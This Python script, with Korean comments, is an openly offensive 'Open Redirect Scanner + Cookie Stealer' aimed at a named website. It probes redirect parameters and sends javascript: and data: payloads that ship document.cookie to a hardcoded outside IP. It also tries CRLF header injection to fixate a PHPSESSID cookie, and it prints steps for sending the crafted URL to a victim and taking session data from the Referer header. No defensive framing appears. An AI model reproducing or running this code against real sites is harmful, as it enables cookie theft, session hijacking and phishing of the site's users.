#!/usr/bin/env python3
"""
Open Redirect Scanner + Cookie Stealer
리다이렉트 취약점으로 쿠키 탈취
"""

import requests
import sys
from urllib.parse import quote

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    END = '\033[0m'
    BOLD = '\033[1m'

class RedirectScanner:
    def __init__(self, base_url):
        self.base_url = base_url

    def test_open_redirect(self):
        """Open Redirect 취약점 테스트"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[1] Open Redirect 테스트{Colors.END}\n")

        evil_url = "http://3.113.201.239:9999/steal"

        # 테스트할 파라미터들
        params_to_test = [
            'redirect',
            'url',
            'next',
            'return',
            'continue',
            'goto',
            'target',
            'dest',
            'destination',
            'redir',
            'redirect_uri',
            'return_url',
        ]

        endpoints = [
            '/login.php',
            '/logout.php',
            '/index.php',
            '/',
        ]

        for endpoint in endpoints:
            for param in params_to_test:
                # 여러 인코딩 방식 시도
                payloads = [
                    evil_url,
                    f"//{evil_url.replace('http://', '')}",
                    f"https://{evil_url.replace('http://', '')}",
                    quote(evil_url),
                    f"javascript:location='{evil_url}'",
                ]

                for payload in payloads:
                    url = f"{self.base_url}{endpoint}?{param}={payload}"

                    print(f"{Colors.YELLOW}Testing:{Colors.END} {url[:80]}...")

                    try:
                        response = requests.get(
                            url,
                            allow_redirects=False,
                            timeout=10
                        )

                        # 리다이렉트 확인
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')

                            if evil_url in location or '3.113.201.239' in location:
                                print(f"{Colors.GREEN}✓ Open Redirect 발견!{Colors.END}")
                                print(f"  Location: {location}\n")
                                return url

                    except Exception as e:
                        pass

        print(f"{Colors.RED}✗ Open Redirect 없음{Colors.END}\n")
        return None

    def test_javascript_redirect(self):
        """JavaScript 리다이렉트 XSS"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[2] JavaScript Redirect 테스트{Colors.END}\n")

        evil_url = "http://3.113.201.239:9999/steal"

        payloads = [
            f"javascript:location='{evil_url}?c='+document.cookie",
            f"javascript:window.location='{evil_url}?c='+document.cookie",
            f"data:text/html,<script>location='{evil_url}?c='+document.cookie</script>",
        ]

        params = ['redirect', 'url', 'next', 'goto']

        for param in params:
            for payload in payloads:
                url = f"{self.base_url}/login.php?{param}={quote(payload)}"

                print(f"{Colors.YELLOW}Testing:{Colors.END} {payload[:60]}...")

                try:
                    response = requests.get(url, timeout=10, allow_redirects=False)

                    if payload in response.text or 'javascript:' in response.text:
                        print(f"{Colors.GREEN}✓ JavaScript Redirect 가능!{Colors.END}\n")
                        return url

                except Exception as e:
                    pass

        print(f"{Colors.RED}✗ JavaScript Redirect 차단됨{Colors.END}\n")
        return None

    def test_header_injection(self):
        """HTTP Header Injection (Response Splitting)"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[3] Header Injection 테스트{Colors.END}\n")

        payloads = [
            "%0d%0aSet-Cookie: PHPSESSID=attacker_session",
            "%0d%0aLocation: http://3.113.201.239:9999/steal",
            "\\r\\nSet-Cookie: PHPSESSID=attacker_session",
        ]

        params = ['redirect', 'url', 'next']

        for param in params:
            for payload in payloads:
                url = f"{self.base_url}/login.php?{param}={payload}"

                print(f"{Colors.YELLOW}Testing:{Colors.END} {payload[:40]}...")

                try:
                    response = requests.get(url, timeout=10, allow_redirects=False)

                    # Set-Cookie 헤더가 주입되었는지 확인
                    if 'attacker_session' in str(response.headers):
                        print(f"{Colors.GREEN}✓ Header Injection 성공!{Colors.END}")
                        print(f"  Headers: {response.headers}\n")
                        return True

                except Exception as e:
                    pass

        print(f"{Colors.RED}✗ Header Injection 차단됨{Colors.END}\n")
        return False

def main():
    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}↪️  Open Redirect + Header Injection Scanner{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    TARGET = "http://healthmash.net"

    print(f"{Colors.BLUE}Target: {TARGET}{Colors.END}\n")

    scanner = RedirectScanner(TARGET)

    # 테스트 실행
    redirect_url = scanner.test_open_redirect()
    js_redirect = scanner.test_javascript_redirect()
    header_injection = scanner.test_header_injection()

    print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}📊 스캔 결과{Colors.END}")
    print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

    if redirect_url or js_redirect or header_injection:
        print(f"{Colors.GREEN}✓ 취약점 발견!{Colors.END}\n")

        if redirect_url:
            print(f"{Colors.GREEN}Open Redirect URL:{Colors.END}")
            print(f"  {redirect_url}\n")
            print(f"{Colors.YELLOW}활용 방법:{Colors.END}")
            print(f"  1. 피해자에게 이 URL 전송")
            print(f"  2. 피해자가 클릭하면 공격자 서버로 리다이렉트")
            print(f"  3. Referer 헤더에서 세션 정보 획득 가능\n")

        if js_redirect:
            print(f"{Colors.GREEN}JavaScript Redirect:{Colors.END}")
            print(f"  {js_redirect}\n")

        if header_injection:
            print(f"{Colors.GREEN}Header Injection 가능!{Colors.END}\n")
    else:
        print(f"{Colors.RED}✗ 취약점 없음{Colors.END}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ 중단됨{Colors.END}")
        sys.exit(0)
